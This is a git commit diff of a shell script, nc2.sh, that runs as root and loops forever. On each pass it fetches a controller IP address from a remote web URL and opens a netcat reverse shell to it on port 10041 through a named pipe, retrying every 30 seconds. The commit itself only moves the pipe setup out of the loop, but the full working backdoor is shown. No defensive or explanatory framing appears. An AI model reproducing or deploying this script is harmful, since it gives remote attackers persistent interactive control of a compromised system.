ebd5de24ad7bfd99e81d5a7e1d14c2468f6ce763
ibnusaja <45093115+ibnusaja@users.noreply.github.com>
2023-04-09 20:17:55 +0800

    Update nc2.sh

--- linux/nc2.sh
+++ linux/nc2.sh
@@ -4,14 +4,15 @@ if [[ "$(id -u)" != "0" ]];then
  exit 0
 fi
 
+rm -rf /tmp/f
+
+mkfifo /tmp/f
+
 while true; do
 
 IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
 PORT="10041"
-rm -rf /tmp/f
-# mkdir /tmp
-mkfifo /tmp/f
-# echo $IP
+
 cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f
 
 sleep 30
